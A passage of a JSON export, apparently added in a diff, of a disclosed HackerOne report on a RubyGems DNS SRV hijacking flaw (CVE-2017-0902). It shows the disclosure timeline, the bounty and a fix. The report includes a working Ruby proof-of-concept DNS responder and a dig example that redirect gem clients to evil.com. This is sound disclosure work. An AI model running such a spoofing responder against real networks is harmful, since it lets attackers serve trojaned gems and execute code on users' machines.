+            "message": "Hey, I'm sorry if I came across a bit short earlier. We really appreciate you reporting the vulnerability and working with us to understand the problem and tease out a fix. There's no need for you to write patches for things you report (unless you want to!, and in which case I think a patch shared here is preferable), but since RubyGems is an open-source project that gets very little of my paid time (from RubyTogether) and is otherwise entirely volunteer-driven, estimating when undeveloped work will ship is next to impossible.\n\nAs soon as another RubyGems maintainer reviews the patch, I'll release it. I think we just want to minimize the amount of time a patch is sitting on GitHub for vulnerabilities, particularly with tests that demonstrate how to exploit them. I hope this all is sensible, I'm still getting the hang of being responsible for security issues.", 
+            "markdown_message": "<p>Hey, I&#39;m sorry if I came across a bit short earlier. We really appreciate you reporting the vulnerability and working with us to understand the problem and tease out a fix. There&#39;s no need for you to write patches for things you report (unless you want to!, and in which case I think a patch shared here is preferable), but since RubyGems is an open-source project that gets very little of my paid time (from RubyTogether) and is otherwise entirely volunteer-driven, estimating when undeveloped work will ship is next to impossible.</p>\n\n<p>As soon as another RubyGems maintainer reviews the patch, I&#39;ll release it. I think we just want to minimize the amount of time a patch is sitting on GitHub for vulnerabilities, particularly with tests that demonstrate how to exploit them. I hope this all is sensible, I&#39;m still getting the hang of being responsible for security issues.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1651832, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-05-03T18:59:45.930Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-05-03T18:59:45.930Z", 
+            "actor": {
+                "username": "claudijd", 
+                "url": "/claudijd", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/131/80363bc2e114aa297d4a15f2deba7621642c6ec1_medium.jpeg?1491096375"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rubygems", 
+            "message": "All sounds sensible to me.  Also, I'm totally willing and able to write patches for bugs I find in the future.", 
+            "markdown_message": "<p>All sounds sensible to me.  Also, I&#39;m totally willing and able to write patches for bugs I find in the future.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1652178, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-07-05T14:47:41.379Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-07-05T14:47:41.379Z", 
+            "actor": {
+                "username": "segiddins", 
+                "url": "/segiddins", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rubygems", 
+            "message": "The fix will be released as soon as we can get some other fixes in order.", 
+            "markdown_message": "<p>The fix will be released as soon as we can get some other fixes in order.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1807335, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-07-05T19:32:10.693Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-07-05T19:32:10.693Z", 
+            "actor": {
+                "username": "claudijd", 
+                "url": "/claudijd", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/131/80363bc2e114aa297d4a15f2deba7621642c6ec1_medium.jpeg?1491096375"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rubygems", 
+            "message": "@segiddins thanks for the update, hope all is good!", 
+            "markdown_message": "<p><a href=\"/segiddins\">@segiddins</a> thanks for the update, hope all is good!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1808621, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-08-18T14:45:33.954Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-08-18T14:46:12.927Z", 
+            "actor": {
+                "username": "claudijd", 
+                "url": "/claudijd", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/131/80363bc2e114aa297d4a15f2deba7621642c6ec1_medium.jpeg?1491096375"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rubygems", 
+            "message": "@segiddins how's it going? Just checking in to see if there is anything I can do to help move this along to release to protect RubyGems end users.", 
+            "markdown_message": "<p><a href=\"/segiddins\">@segiddins</a> how&#39;s it going? Just checking in to see if there is anything I can do to help move this along to release to protect RubyGems end users.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1939064, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "claudijd", 
+                "url": "/claudijd"
+            }, 
+            "created_at": "2017-08-28T02:07:45.197Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-08-28T02:07:45.197Z", 
+            "actor": {
+                "username": "segiddins", 
+                "url": "/segiddins", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rubygems", 
+            "message": "Released in http://blog.rubygems.org/2017/08/27/2.6.13-released.html", 
+            "markdown_message": "<p>Released in <a title=\"http://blog.rubygems.org/2017/08/27/2.6.13-released.html\" href=\"/redirect?signature=ac71d7eadf4bdf64e886fe7e2e57f6393ebdec56&amp;url=http%3A%2F%2Fblog.rubygems.org%2F2017%2F08%2F27%2F2.6.13-released.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://blog.rubygems.org/2017/08/27/2.6.13-released.html</span><i class=\"icon-external-link\"></i></a></p>\n", 
+            "type": "Activities::BugResolved", 
+            "id": 1958763, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-08-28T02:08:27.449Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-08-28T02:08:27.449Z", 
+            "actor": {
+                "username": "mame", 
+                "url": "/mame", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {
+                "duplicate_report_id": 243005
+            }, 
+            "team_handle": "rubygems", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ExternalUserJoined", 
+            "id": 1958765, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-08-28T13:24:27.606Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-08-28T13:24:27.606Z", 
+            "actor": {
+                "username": "claudijd", 
+                "url": "/claudijd", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/131/80363bc2e114aa297d4a15f2deba7621642c6ec1_medium.jpeg?1491096375"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rubygems", 
+            "message": "Can this report be made public?", 
+            "markdown_message": "<p>Can this report be made public?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1959679, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-08-28T13:50:11.207Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-08-28T13:50:11.207Z", 
+            "actor": {
+                "username": "claudijd", 
+                "url": "/claudijd", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/131/80363bc2e114aa297d4a15f2deba7621642c6ec1_medium.jpeg?1491096375"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rubygems", 
+            "message": "Can I also be CC'd on the duplicate bug?", 
+            "markdown_message": "<p>Can I also be CC&#39;d on the duplicate bug?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1959748, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-08-28T14:41:32.393Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-08-28T14:41:32.393Z", 
+            "actor": {
+                "username": "segiddins", 
+                "url": "/segiddins", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rubygems", 
+            "message": "> Can this report be made public?\n\nSure\n\n> Can I also be CC'd on the duplicate bug?\n\nI have no idea how to do that\n", 
+            "markdown_message": "<blockquote>\n<p>Can this report be made public?</p>\n</blockquote>\n\n<p>Sure</p>\n\n<blockquote>\n<p>Can I also be CC&#39;d on the duplicate bug?</p>\n</blockquote>\n\n<p>I have no idea how to do that</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1960045, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-08-28T16:41:24.228Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-08-28T16:41:24.228Z", 
+            "actor": {
+                "username": "segiddins", 
+                "url": "/segiddins", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rubygems", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 1960606, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-08-30T23:31:41.700Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-08-30T23:31:41.700Z", 
+            "actor": {
+                "username": "indirect", 
+                "url": "/indirect", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/097/577/23786b25bd4c9fb25efcb425e5a76b92c052fcef_medium.jpg?1477380547"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rubygems", 
+            "message": "@claudijd I have CCed you on the duplicate bug.", 
+            "markdown_message": "<p><a href=\"/claudijd\">@claudijd</a> I have CCed you on the duplicate bug.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1967703, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-08-30T23:32:01.667Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-08-30T23:32:01.667Z", 
+            "actor": {
+                "username": "indirect", 
+                "url": "/indirect", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/097/577/23786b25bd4c9fb25efcb425e5a76b92c052fcef_medium.jpg?1477380547"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rubygems", 
+            "cve_ids": [
+                "CVE-2017-0902"
+            ], 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::CveIdAdded", 
+            "id": 1967704, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2017-08-30T23:35:57.719Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-08-30T23:35:57.719Z", 
+            "actor": {
+                "url": "/rubygems", 
+                "profile": {
+                    "name": "RubyGems"
+                }, 
+                "ibb": true, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/008/212/fb193d1c05feff770bc8d4a69e09613b5f9f4c3d_medium.png?1469676240"
+                }
+            }, 
+            "team_handle": "rubygems", 
+            "bonus_amount": "0.0", 
+            "bounty_amount": "1000.0", 
+            "collaborator": {
+                "username": "claudijd", 
+                "url": "/claudijd"
+            }, 
+            "message": "Thank you for your report! Based on the [guidelines posted on the RubyGems HackerOne project](https://hackerone.com/rubygems), this report is considered medium impact: allows remote code execution, but does not guarantee it. Therefore, we are awarding a bounty of $1000.", 
+            "markdown_message": "<p>Thank you for your report! Based on the <a href=\"https://hackerone.com/rubygems\">guidelines posted on the RubyGems HackerOne project</a>, this report is considered medium impact: allows remote code execution, but does not guarantee it. Therefore, we are awarding a bounty of $1000.</p>\n", 
+            "type": "Activities::BountyAwarded", 
+            "id": 1967709, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-08-30T23:36:42.952Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-08-30T23:36:42.952Z", 
+            "actor": {
+                "username": "indirect", 
+                "url": "/indirect", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/097/577/23786b25bd4c9fb25efcb425e5a76b92c052fcef_medium.jpg?1477380547"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rubygems", 
+            "message": "Disclosing, as requested by reporter.", 
+            "markdown_message": "<p>Disclosing, as requested by reporter.</p>\n", 
+            "type": "Activities::ManuallyDisclosed", 
+            "id": 1967710, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "claudijd", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/claudijd", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/003/131/e7b9f129ae5318adab0fcb4457cb7eda2dd97a05_small.jpeg?1491096375"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 70, 
+        "name": "Code Injection"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -37605122.64032735, 
+    "disclosed_at": "2017-08-30T23:36:42.991Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/218088", 
+    "created_at": "2017-04-02T17:31:05.933Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<p><strong>Description:</strong></p>\n\n<p>The RubyGems client supports a gem server API discovery functionality,<br>\nwhich is used when pushing or pulling gems to a gem distribution/hosting<br>\nserver, like RubyGems.org.  This functionality is provided via a SRV DNS<br>\nrequest to the users gem source hostname prepended with &quot;_rubygems._tcp.&quot;.<br>\nThe response to this request tells the RubyGems client (aka: the gem<br>\ncommand) where the users gem server API is.  In the default RubyGems<br>\nscenario, with a gem source of <a title=\"https://rubygems.org\" href=\"/redirect?signature=ad6341af7f885f71d5816128e9b49b08784400bc&amp;url=https%3A%2F%2Frubygems.org\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://rubygems.org</span><i class=\"icon-external-link\"></i></a>, the users SRV DNS<br>\nrequest and reply will look like this:</p>\n<pre class=\"highlight plaintext\"><code>~ $ dig srv _rubygems._tcp.rubygems.org +short\n0 1 80 api.rubygems.org.\n</code></pre>\n<p>Due to a deficiency in DNS response verification, a MiTM positioned <br>\nattacker can poison the DNS response to this record response and force<br>\nthe client to unknowingly download and install Ruby gems from an attacker<br>\ncontrolled gem server in an alternate security domain.  An example of<br>\nsuch a scenario would look like so:</p>\n<pre class=\"highlight plaintext\"><code>~ $ dig _rubygems._tcp.rubygems.org SRV +short\n0 0 53 evil.com/api.rubygems.com.\n</code></pre>\n<p>In such a scenario, the attacker is able to serve the client malicious gem<br>\ncontent, resulting in trivial remote code execution scenarios.  For<br>\nexample, the attacker could simply modify the gem source code and trigger<br>\ncode execution via the extensions API at install time on the client machine<br>\n(a gem trojaning technique described by Ben Smith in his &quot;Hacking with<br>\nGems&quot; presentation at Aloha Ruby Conference in 2012 -<br>\n<a title=\"https://www.youtube.com/watch?v=z-5bO0Q1J9s)/\" href=\"/redirect?signature=fa81b9e03fafa9874cffc7c08f54d808734969c6&amp;url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3Dz-5bO0Q1J9s%29%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.youtube.com/watch?v=z-5bO0Q1J9s)/</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>This vulnerability has the same net effect/impact as <a href=\"/redirect?signature=2b6188afb69c165e4f794ffe0a31e9e526af2856&amp;url=https%3A%2F%2Fnvd.nist.gov%2Fvuln%2Fdetail%2FCVE-2015-3900\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>CVE-2015-3900</span><i class=\"icon-external-link\"></i></a> and<br>\n<a href=\"/redirect?signature=a218b6fb3557105f374e0b3ba9dd4d7c2b2c5024&amp;url=https%3A%2F%2Fnvd.nist.gov%2Fvuln%2Fdetail%2FCVE-2015-4020\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>CVE-2015-4020</span><i class=\"icon-external-link\"></i></a>.</p>\n\n<p><strong>Affected method in Gem::RemoteFetcher:</strong></p>\n\n<p><a title=\"https://github.com/rubygems/rubygems/blob/5096fa35c1ca3e0a7d175aaf9d77cd93114fd977/lib/rubygems/remote_fetcher.rb#L101-L119\" href=\"/redirect?signature=ca477b8a1b8e4f55ec4fbff9978d6c17b754616f&amp;url=https%3A%2F%2Fgithub.com%2Frubygems%2Frubygems%2Fblob%2F5096fa35c1ca3e0a7d175aaf9d77cd93114fd977%2Flib%2Frubygems%2Fremote_fetcher.rb%23L101-L119\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/rubygems/rubygems/blob/5096fa35c1ca3e0a7d175aaf9d77cd93114fd977/lib/rubygems/remote_fetcher.rb#L101-L119</span><i class=\"icon-external-link\"></i></a></p>\n\n<p><strong>PoC DNS SRV Responder:</strong></p>\n<pre class=\"highlight ruby\"><code><span class=\"c1\">#!/usr/bin/env ruby</span>\n<span class=\"nb\">require</span> <span class=\"s1\">&#39;rubydns&#39;</span>\n<span class=\"nb\">require</span> <span class=\"s1\">&#39;rubydns/system&#39;</span>\n<span class=\"no\">INTERFACES</span> <span class=\"o\">=</span> <span class=\"p\">[</span>\n    <span class=\"p\">[</span><span class=\"ss\">:udp</span><span class=\"p\">,</span> <span class=\"s2\">&quot;0.0.0.0&quot;</span><span class=\"p\">,</span> <span class=\"mi\">53</span><span class=\"p\">],</span>\n    <span class=\"p\">[</span><span class=\"ss\">:tcp</span><span class=\"p\">,</span> <span class=\"s2\">&quot;0.0.0.0&quot;</span><span class=\"p\">,</span> <span class=\"mi\">53</span><span class=\"p\">]</span>\n<span class=\"p\">]</span>\n<span class=\"no\">Name</span> <span class=\"o\">=</span> <span class=\"no\">Resolv</span><span class=\"o\">::</span><span class=\"no\">DNS</span><span class=\"o\">::</span><span class=\"no\">Name</span>\n<span class=\"no\">IN</span> <span class=\"o\">=</span> <span class=\"no\">Resolv</span><span class=\"o\">::</span><span class=\"no\">DNS</span><span class=\"o\">::</span><span class=\"no\">Resource</span><span class=\"o\">::</span><span class=\"no\">IN</span>  \n<span class=\"no\">RubyDNS</span><span class=\"o\">::</span><span class=\"n\">run_server</span><span class=\"p\">(</span><span class=\"ss\">:listen</span> <span class=\"o\">=&gt;</span> <span class=\"no\">INTERFACES</span><span class=\"p\">)</span> <span class=\"k\">do</span>\n  <span class=\"n\">match</span><span class=\"p\">(</span><span class=\"sr\">//</span><span class=\"p\">,</span> <span class=\"no\">IN</span><span class=\"o\">::</span><span class=\"no\">SRV</span><span class=\"p\">)</span> <span class=\"k\">do</span> <span class=\"o\">|</span><span class=\"n\">transaction</span><span class=\"o\">|</span>\n    <span class=\"n\">transaction</span><span class=\"p\">.</span><span class=\"nf\">respond!</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"mi\">53</span><span class=\"p\">,</span><span class=\"s2\">&quot;evil.com/api.rubygems.com&quot;</span><span class=\"p\">)</span>\n  <span class=\"k\">end</span>\n<span class=\"k\">end</span>\n</code></pre>\n<p><strong>Recommendations:</strong></p>\n\n<p>Consider this small patch to address the immediate attack vector...</p>\n<pre class=\"highlight plaintext\"><code>-      if /\\.#{Regexp.quote(host)}\\z/ =~ target\n+      if (/\\.#{Regexp.quote(host)}\\z/ =~ target) &amp;&amp; !target.include?(&quot;/&quot;)\n</code></pre>\n<p>Also, consider moving away from doing API discovery via DNS.  Would recommend <br>\nmoving to HTTPS, where you will have a stronger transport security chain.</p>\n\n<p><strong>References (these are not new, just references prior work here to help triage team understand impact):</strong></p>\n\n<ul>\n<li><a title=\"https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-007/?fid=6356\" href=\"/redirect?signature=78b21402cf25143352b31ae1a976ddfa5b0d45c5&amp;url=https%3A%2F%2Fwww.trustwave.com%2FResources%2FSecurity-Advisories%2FAdvisories%2FTWSL2015-007%2F%3Ffid%3D6356\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-007/?fid=6356</span><i class=\"icon-external-link\"></i></a></li>\n<li><a title=\"https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-009/?fid=6478\" href=\"/redirect?signature=642e5bca54bfa62c4e36dd7c2916268ee5b7f2c9&amp;url=https%3A%2F%2Fwww.trustwave.com%2FResources%2FSecurity-Advisories%2FAdvisories%2FTWSL2015-009%2F%3Ffid%3D6478\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-009/?fid=6478</span><i class=\"icon-external-link\"></i></a></li>\n<li><a title=\"https://speakerdeck.com/claudijd/trojaned-gems-you-cant-tell-youre-using-one\" href=\"/redirect?signature=8c145e935358e8f806076749488544e491904bfa&amp;url=https%3A%2F%2Fspeakerdeck.com%2Fclaudijd%2Ftrojaned-gems-you-cant-tell-youre-using-one\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://speakerdeck.com/claudijd/trojaned-gems-you-cant-tell-youre-using-one</span><i class=\"icon-external-link\"></i></a></li>\n<li><a title=\"http://blog.rubygems.org/2015/05/14/CVE-2015-3900.html\" href=\"/redirect?signature=8b0bdf9227de116243d75fd1ab82176910f8c317&amp;url=http%3A%2F%2Fblog.rubygems.org%2F2015%2F05%2F14%2FCVE-2015-3900.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://blog.rubygems.org/2015/05/14/CVE-2015-3900.html</span><i class=\"icon-external-link\"></i></a></li>\n</ul>\n", 
+    "severity_rating": "high", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://rubygems.org", 
+            "about": "RubyGems.org is the Ruby community\u2019s gem hosting service.", 
+            "twitter_handle": "rubygems_status", 
+            "name": "RubyGems"
+        }, 
+        "handle": "rubygems", 
+        "url": "https://hackerone.com/rubygems", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/008/212/0e820a45b51fb96fad86945c67150263527c69ed_small.png?1469676240", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/008/212/fb193d1c05feff770bc8d4a69e09613b5f9f4c3d_medium.png?1469676240"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 8212, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
